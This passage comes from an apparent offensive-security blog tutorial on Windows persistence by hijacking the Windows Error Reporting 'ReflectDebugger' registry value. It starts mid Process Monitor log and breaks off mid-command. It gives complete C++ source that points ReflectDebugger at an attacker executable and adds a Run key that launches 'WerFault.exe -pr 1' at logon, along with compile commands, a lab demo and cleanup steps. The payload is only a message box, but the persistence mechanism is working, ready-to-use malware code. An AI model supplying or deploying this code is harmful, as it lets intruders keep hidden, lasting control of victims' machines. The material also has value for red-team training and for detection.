HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\GDI32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\TransparentEnabled\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers\\LongPathsEnabled\n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\advapi32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  7:47:5...   WerFault.exe    88    Load Image      C:\\Windows\\System32\\user32.dll\n  7:47:5...   WerFault.exe    88    RegOpenKey      HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\n  7:47:5...   WerFault.exe    88    RegCloseKey     \n  \n  Result       Detail\n  SUCCESS      Parent PID: 3\n  SUCCESS      Image Base: \n  SUCCESS      Image Base: \n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  REPARSE      NAME NOT FOUND\n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  REPARSE      NAME NOT FOUND\n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access: \n  SUCCESS      Desired Access:\n```\n\nAdd another filter:\n\n```image\nAlt: pers\nDescription: The image displays a screenshot from a Windows PowerShell session and the Sysinternals Process Monitor tool. In the foreground, the Process Monitor's filter settings are open, showing a filter that includes entries where the 'Process Name' is 'WerFault.exe' and the 'Result' is 'NAME NOT FOUND'. The background shows the PowerShell window where the command 'WerFault.exe -pr 1' has been executed. The image illustrates the behavior of the Windows Error Reporting (WER) mechanism and how it can be monitored for specific processes and results, supporting the analysis of potential vulnerabilities related to registry manipulation.\nTranscription: |\n  Process Monitor - Sysinternals - www.sysinternals.com\n  \n  Display entries matching these conditions:\n  Result is NAME NOT FOUND\n  \n  Column          Relation         Value\n  -----------------------------------------------\n  Process Name    contains         WerFault.exe\n  Result          is               NAME NOT FOUND\n  Process Name    is               Procmon.exe\n  Process Name    is               Procexp.exe\n  Process Name    is               Autoruns.exe\n  Process Name    is               Procexp64.exe\n  Process Name    is               System\n  \n  [OK] [Cancel] [Apply]\n```\n\nAs a result, we have a loophole for hijacking this value:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Sysinternals Process Monitor tool running on a Windows system. The top window displays a Windows PowerShell session where the command 'WerFault.exe -pr 1' is executed. Below, the Process Monitor logs various operations conducted by 'WerFault.exe', including registry queries related to 'HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger'. This demonstrates how the executable interacts with the Windows registry, highlighting a potential method for malware persistence by hijacking the ReflectDebugger registry value.\nTranscription: |\n  Time        Process Name      PID  Operation        Path\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\ResourcePolicies\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Control\\SafeBoot Option\n  7:47:55.    WerFault.exe      88   RegQueryKey      HKLM\\System\\CurrentControlSet\\Services\\Sr\\GP\\DLL\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Windows\\safer\\codeidentifiers\\TransparentEnabled\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Windows\\Safer\\CodeIdentifiers\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Session Manager\\ResourcePolicies\n  7:47:55.    WerFault.exe      88   RegOpenKey       HKLM\\System\\CurrentControlSet\\Services\\SafeDllSearchMode\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Lsa\\FipsAlgorithmPolicy\\MDMEnabled\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\SystemHeap\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Private\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\Error Reporting\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Security\\5fec44b7-451f-4afe-ced084013\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ErrorFlags\n  7:47:55.    WerFault.exe      88   RegQueryValue    HKLM\\Software\\Microsoft\\Windows\\Error Reporting\\Hangs\\ReflectDebugger\n```\n\nSo, what is the trick? We can replace the registry value\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\n```\n\nwith our evil application, because `WerFault.exe` not only reads this value but also runs it. And of course, we can use it for persistence.\n\n### Practical example\n\nFor simplicity, as usually, my “evil” application is just `meow-meow` messagebox (`hack.cpp`):\n\n```\n/*\nmeow-meow messagebox\nauthor: @cocomelonc\n*/\n#include <windows.h>\n#pragma comment (lib, \"user32.lib\")\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n  MessageBoxA(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nAnd then, create a script which creates a registry key value with my “evil” app:\n\n```\nint main(int argc, char *argv[]) {\n  HKEY hkey = NULL;\n\n  // malicious app\n  const char *exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n\n  // hijacked app\n  const char *wf = \"WerFault.exe -pr 1\";\n\n  // set evil app\n  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n}\n```\n\nAlso, I used one of the classic tricks for persistence:\n\n```\n// startup\nres = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_WRITE, &hkey);\nif (res == ERROR_SUCCESS) {\n  // create new registry key\n  RegSetValueEx(hkey, (LPCSTR)\"meow\", 0, REG_SZ, (unsigned char*)wf, strlen(wf));\n  RegCloseKey(hkey);\n}\n```\n\nAs a result, the final source code looks something like this (`pers.cpp`):\n\n```\n/*\npers.cpp\nwindows persistence via WerFault.exe\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n*/\n#include <windows.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\n  HKEY hkey = NULL;\n\n  // malicious app\n  const char *exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n\n  // hijacked app\n  const char *wf = \"WerFault.exe -pr 1\";\n\n  // set evil app\n  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe));\n    RegCloseKey(hkey);\n  }\n\n  // startup\n  res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_WRITE, &hkey);\n  if (res == ERROR_SUCCESS) {\n    // create new registry key\n    RegSetValueEx(hkey, (LPCSTR)\"meow\", 0, REG_SZ, (unsigned char*)wf, strlen(wf));\n    RegCloseKey(hkey);\n  }\n  return 0;\n}\n```\n\n### Demo\n\nLet’s go to see everything in action. Compile our “evil” app:\n\n```\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n```image\nAlt: pers\nDescription: The image shows a terminal session displaying the output of a command that compiles a C++ file named 'hack.cpp' into an executable named 'hack.exe'. The terminal output indicates the file sizes and permissions of the compiled executable, along with the source files present in the directory. The command used includes various flags for optimization and linking, suggesting it is part of a demonstration related to malware persistence techniques.\nTranscription: |\n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdatas-sections -Wno-write-strings -fn-o-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n  \n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ ls -l\n  total 24\n  -rw-r--r-- 1 cocomelonc cocomelonc  232 Nov  2 04:35 hack.cpp\n  -rwxr-xr-x 1 cocomelonc cocomelonc 14848 Nov  2 04:54 hack.exe\n  -rw-r--r-- 1 cocomelonc cocomelonc  1049 Nov  2 04:34 pers.cpp\n  \n  (cocomelonc✗ kali)-[~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $\n```\n\nand persistence script:\n\n```\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n```image\nAlt: pers\nDescription: The image shows a terminal output in a Linux-like environment, displaying a list of files in a directory. The output includes timestamps and file permissions, with two specific files highlighted: 'pers.exe' and 'hack.exe'. The context suggests these are executable files related to a malware demonstration, showing their sizes and last modification times. This image provides relevant technical information about the compiled malware files.\nTranscription: |\n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n  \n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $ ls -lt\n  total 40\n  -rwxr-xr-x 1 cocomelonc cocomelonc 15360 Nov  2 04:55 pers.exe\n  -rwxr-xr-x 1 cocomelonc cocomelonc 14848 Nov  2 04:54 hack.exe\n  -rw-r--r-- 1 cocomelonc cocomelonc    232 Nov  2 04:35 hack.cpp\n  -rw-r--r-- 1 cocomelonc cocomelonc   1049 Nov  2 04:34 pers.cpp\n  \n  (cocomelonc✗ kali) - [~/hacking/cybersec_blog/2022-11-02-malware-pers-18]\n  $\n```\n\nBefore running everything, first of all, check the registry key and value:\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\" /s\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ReflectDebugger\" /s\n```\n\nRun “malware” for checking correctness:\n\n```\n.\\hack.exe\n```\n\n```image\nAlt: pers\nDescription: The image depicts a Windows PowerShell window running on a virtual machine. It shows several commands being executed to interact with the Windows Error Reporting service, such as querying registry keys and running a malware executable called 'hack.exe'. There is also a pop-up message box displaying 'Meow-meow!' from the executed application. The command output indicates the current directory and lists files relevant to the malware demonstration, including 'hack.cpp' and 'pers.cpp'.\nTranscription: |\n  Administrator: Windows PowerShell\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> .\\ViewFault.exe -pr 1\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\\\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS C:\\Windows\\system32> cd Z:\\2022-11-02-malware-pers-18\n  PS Z:\\2022-11-02-malware-pers-18> dir\n  \n  Directory: Z:\\2022-11-02-malware-pers-18\n  \n  Mode         LastWriteTime            Length Name\n  ----         -------------            ------ ----\n  ------       11/2/2022  7:35 AM       232 hack.cpp\n  ------       11/2/2022  7:55 AM       15360 pers.exe\n  ------       11/2/2022  7:54 AM       148484 hack.exe\n  ------       11/2/2022  7:54 AM       1049 pers.cpp\n  \n  PS Z:\\2022-11-02-malware-pers-18> .\\hack.exe\n  \n  Meow-meow!\n  [OK]\n```\n\nAlso, check registry keys which are used for persistence logic:\n\n```\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n```\n\n```image\nAlt: pers\nDescription: The image displays a Windows PowerShell interface showing a series of commands executed by the user. It includes commands querying the Windows registry related to the Windows Error Reporting and a list of files in a directory. The output indicates the existence of two executables: 'hack.exe' and 'pers.exe', along with their associated source code files. The highlighted section shows a specific registry entry under 'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', which contains background processes including 'OneDrive.exe' and 'Process Hacker 2.exe'. This context is relevant for understanding malware persistence techniques and registry manipulation.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> .\\WerFault.exe -pr 1\n  PS C:\\Windows\\system32> .\\WerFault.exe -pr 1\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  ERROR: The system was unable to find the specified registry key or value.\n  PS C:\\Windows\\system32> cd Z:\\2022-11-02-malware-pers-18\\\n  PS Z:\\2022-11-02-malware-pers-18> dir\n  \n  Directory: Z:\\2022-11-02-malware-pers-18\n  \n  Mode         LastWriteTime            Length Name\n  ----         -------------            ------ ----\n  ------       11/2/2022  7:35 AM       232 hack.cpp\n  ------       11/2/2022  7:55 AM       15360 pers.exe\n  ------       11/2/2022  7:54 AM       14848 hack.exe\n  ------       11/2/2022  7:34 AM       1049 pers.cpp\n  \n  PS Z:\\2022-11-02-malware-pers-18> .\\hack.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n```\n\nThen, run\n\n```\npers.exe\n```\n\nand check Windows Error Reporting registry key again:\n\n```\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n```\n\n```image\nAlt: pers\nDescription: The image shows a Windows PowerShell interface where various commands are executed related to Windows Error Reporting and malware persistence. The highlighted section indicates a successful change in the registry key for the ReflectDebugger under HKEY_LOCAL_MACHINE, showing that the 'hack.exe' application has been registered. There are error messages from previous commands indicating missing registry keys, followed by successful queries demonstrating the modifications made by the malware.\nTranscription: |\n  [SC] QueryServiceConfig SUCCESS\n  \n  SERVICE_NAME: TrustedInstaller\n          TYPE               : 10  WIN32_OWN_PROCESS\n          STATE              : 3  DEMAND_START\n          ERROR_CONTROL      : 1  NORMAL\n          BINARY_PATH_NAME   : C:\\Windows\\servicing\\TrustedInstaller.exe\n          LOAD_ORDER_GROUP   : ProfSvc_Group\n  \n  Administrator: Windows PowerShell\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\"\n  ERROR: The system was unable to find the specified registry key or value.\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  PS Z:\\2022-11-02-malware-pers-18> WerFault.exe -pr 1\n  PS Z:\\2022-11-02-malware-pers-18> .\\pers.exe\n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n```\n\nAs you can see, the key value is edited and we can check correctness via running:\n\n```\nWerFault.exe -pr 1\n```\n\n```image\nAlt: pers\nDescription: The image displays a screenshot of a Windows PowerShell interface showing command outputs related to Windows Error Reporting. The commands are querying specific registry keys and listing processes. Additionally, a message box with the text \"Meow-meow!\" is shown, suggesting the successful execution of a script or malware that interacts with the Windows Error Reporting feature. The top of the image includes code indicating the inclusion of a Windows header and a function definition for displaying the message box.\nTranscription: |\n  meow-meow:messagebox\n  author: @ccomelon<--\n  */\n  #include <windows.h>\n  \n  int WINAPI winMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n      MessageBox(NULL, \"Meow-meow!\" , \" ^_^ \", MB_OK);\n      return 0;\n  }\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  PS Z:\\2022-11-02-malware-pers-18> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\\ReflectDebugger\"\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Error Reporting\\Hangs\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n  \n  PS Z:\\2022-11-02-malware-pers-18> Werfault.exe -pr 1\n  \n  PS Z:\\2022-11-02-malware-pers-18> Werfault.exe -pr 1\n```\n\nThen, logout and login.\n\nand after a few seconds our `meow-meow` messagebox is popped-up as expected:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of a Windows 10 desktop environment with a pop-up windows says \"Meow-meow!\"\n```\n\nYou can check the properties of `hack.exe` via Process Hacker 2:\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of the Process Hacker application displaying the properties of a process named `hack.exe`. It includes details such as the command line used to start the process, the current directory, the start time, the PEB address, and the parent process status. Additionally, there is a pop-up message box from the `hack.exe` application that says \"Meow-meow!\" indicating successful execution. The background contains a list of other processes running on the system, showcasing an environment likely set up for malware testing or demonstration.\nTranscription: |\n  Process Hacker [WINDOWS-V9HNK33\\User]\n  \n  Process: hack.exe (4116) Properties\n  \n  General\n    File\n      N/A\n      (UNVERIFIED)\n      Version: N/A\n      Image file name: \\\\BoxSvr\\shared\\2022-11-02-malware-pers-18\\hack.exe\n  \n  Process\n    Command line: Z:\\2022-11-02-malware-pers-18\\hack.exe 2556\n    Current directory: C:\\Windows\\system32\n    Started: 49 seconds ago (8:14:10 AM 11/2/2022)\n    PEB address: 0x382f64d000\n    Parent: Non-existent process (2556)\n    Mitigation policies: DEP (permanent); ASLR (high entropy)\n    Protection: None\n```\n\nAlso, pay attention that admin privileges are required for hijacking Windows Error Reporting, but for persistence, we use low-level privileges:\n\n```\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" -Name \"ReflectDebugger\"\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"meow\"\n```\n\n```image\nAlt: pers\nDescription: The image displays a split-screen view featuring a C++ code snippet on the left side and a Windows PowerShell interface on the right side. The code outlines functions related to malware persistence by manipulating Windows registry keys. The PowerShell window shows command outputs querying registry values, specifically for 'ReflectDebugger' and entries under 'CurrentVersion\\Run'. Additionally, a pop-up message box titled 'Meow-meow!' appears, indicating the execution of the malicious application. This visual effectively illustrates the technical process of malware persistence in a Windows environment.\nTranscription: |\n  cpp\n  // pers.cpp\n  // windows_persistense via WerFault.exe\n  // author: @cocomelonc\n  // https://cocomelonc.github.io/malware/2022/11/02/malware-pers-17.html\n  #include <windows.h>\n  #include <string.h>\n  \n  int main(int argc, char* argv[]) {\n      HKEY hkey = NULL;\n  \n      // malicious app\n      const char* exe = \"Z:\\\\2022-11-02-malware-pers-18\\\\hack.exe\";\n      // hijacked app\n      const char* wf = \"WerFault.exe -pr 1\";\n  \n      // set evil app\n      LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\", 0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"ReflectDebugger\", 0, REG_SZ, (unsigned char*)exe, strlen(exe) + 1);\n          RegCloseKey(hkey);\n      }\n  \n      // startup\n      res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_SET_VALUE, &hkey);\n      if (res == ERROR_SUCCESS) {\n          // create new registry key\n          RegSetValueEx(hkey, (LPCSTR)\"wf\", 0, REG_SZ, (unsigned char*)wf, strlen(wf) + 1);\n          RegCloseKey(hkey);\n      }\n      return 0;\n  }\n  ```\n  \n  ```\n  PS C:\\Users\\User> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n      ReflectDebugger    REG_SZ    Z:\\2022-11-02-malware-pers-18\\hack.exe\n  \n  PS C:\\Users\\User> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n      wf    REG_SZ    WerFault.exe -pr 1\n  ```\n  \n  ```\n  =^.^=\n  Meow-meow!\n  [OK]\n```\n\n```image\nAlt: pers\nDescription: The image shows a screenshot of a Windows PowerShell terminal in a virtual machine environment. The terminal displays several commands related to querying and modifying Windows registry keys, specifically targeting the Windows Error Reporting and CurrentVersion Run sections. Key details include attempts to query registry settings, and an error message indicating that requested registry access is not allowed, highlighted in red. This suggests a focus on malware persistence techniques through registry manipulation.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Users\\user> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  \n  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n      RefCount    REG_SZ    1\n      v2:2022-11-02-malware-pers-18\\hack.exe\n  \n  PS C:\\Users\\user> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\user\\AppData\\Local\\Microsoft\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Users\\user> Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"wf\"\n  \n  PS C:\\Users\\user> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\user\\AppData\\Local\\Microsoft\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Users\\user> Remove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\" -Name \"ReflectDebugger\"\n  Remove-ItemProperty : Requested registry access is not allowed.\n  At line:1 char:1\n  + Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows E ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : PermissionDenied: (HKEY_LOCAL_MACH...Reporting\\Hangs:String) [Remove-ItemPr\n     opperty], SecurityException\n      + FullyQualifiedErrorId : System.Security.SecurityException,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand\n  \n  PS C:\\Users\\user> _\n```\n\n```image\nAlt: pers\nDescription: The image shows a Windows PowerShell interface running on a virtual machine with an Administrator prompt. It displays a series of commands related to Windows Error Reporting and registry manipulation. The commands include 'Remove-ItemProperty' for removing a registry key, and 'reg query' commands for checking specific registry paths. The background indicates that this is part of a demonstration related to malware persistence techniques, specifically focusing on the hijacking of the Windows Error Reporting system.\nTranscription: |\n  Windows PowerShell\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  PS C:\\Windows\\system32> Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs' -Name 'ReflectDebugger'\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\"\n  PS C:\\Windows\\system32> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\\"\n  PS C:\\Windows\\system32> reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n  ERROR: The system was unable to find the specified registry key or value.\n  \n  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n      OneDrive    REG_SZ    \"C:\\Users\\User\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n      Process Hacker 2    REG_SZ    \"C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe\" -hide\n  \n  PS C:\\Windows\\system32>\n```\n\nWhich can you notice if you decide to “return everything back to its place”.\n\nSo, as you can see everything worked perfectly! =^..^=\n\n> The next one was supposed to be 17, but it will come out together with the third part about the theft of tokens. I couldn’t understand for 10 minutes why it doesn’t work for me :)\n\n```image\nAlt: pers\nDescription: The image displays a PowerShell window running on a Windows 10 virtual machine. It shows a series of commands related to the Windows Registry, particularly focusing on the 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs' key. The commands include attempts to create and query registry entries, specifically the 'ReflectDebugger' entry. The output highlights errors encountered during these operations, indicating that certain registry keys do not exist. The output also confirms the presence of the 'ReflectDebugger' entry with a corresponding path to a malicious executable ('hack.exe'). Overall, the image provides detailed command-line interactions that illustrate the process of manipulating Windows Error Reporting for malicious persistence.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\n  \n  Name                Type      Data\n  (Default)          REG_SZ    (value not set)\n  ReflectDebugger     REG_SZ    Z:\\2022-11-02-malware-pers-17\\hack.exe\n  \n  Administrator: Windows PowerShell\n  PS Z:\\2022-11-02-malware-pers-18> New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error 